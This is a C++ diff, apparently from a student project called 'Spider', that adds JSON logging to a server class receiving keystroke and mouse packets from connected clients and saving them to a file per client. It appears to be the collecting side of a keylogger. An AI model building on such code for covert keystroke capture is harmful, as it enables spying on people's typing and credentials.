@@ -5,7 +5,7 @@
 // Login   <chapui_s@epitech.eu>
 //
 // Started on  Wed Oct 21 09:18:47 2015 chapui_s
-// Last update Wed Oct 21 09:18:47 2015 chapui_s
+// Last update Tue Oct 27 17:24:05 2015 bresci_b bresci_b
 //
 
 #include "Spider.hh"
@@ -16,12 +16,15 @@ Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web)
     _web(web)
 {
   DEBUG_MSG("Spider created");
+  _json = new Json();
   _socket->handleError([this](){dieInDignity();});
 }
 
 Spider::~Spider()
 {
   DEBUG_MSG("Spider deleted");
+  if (_json)
+    delete _json;
 }
 
 void		Spider::dieInDignity()
@@ -47,11 +50,12 @@ void			Spider::doFirstConnection()
       _socket->async_read(_buffer.data(), sizeName, [this, sizeName]() {
       	  _buffer.getValue<char>(_str, sizeName);
 	  _name = _str;
-
 	  _buffer[0] = 1;
 	  _socket->async_write(_buffer.data(), 1, [this](){ getTypeInfo(); });
       	});
     });
+  if (_json)
+    _json->openFile(_name);
 }
 
 void			Spider::getTypeInfo()
@@ -111,7 +115,8 @@ void			Spider::getKeystrokes()
 	      std::cerr << paquet << std::endl;
 #endif // !DEBUG
 
-	      // BORIS C'EST ICI QUE TU RECUPERES LE PAQUET
+	      if (_json)
+		_json->writePaquetKeys(&paquet);
 
 	      getTypeInfo();
 	    });
@@ -143,7 +148,8 @@ void			Spider::getMouse()
 	  std::cerr << paquet << std::endl;
 #endif // !DEBUG
 
-	  // TU RECUPERES LE PAQUET ICI
+	  if (_json)
+	    _json->writePaquetMouse(&paquet);
 
 	  getTypeInfo();
 	});
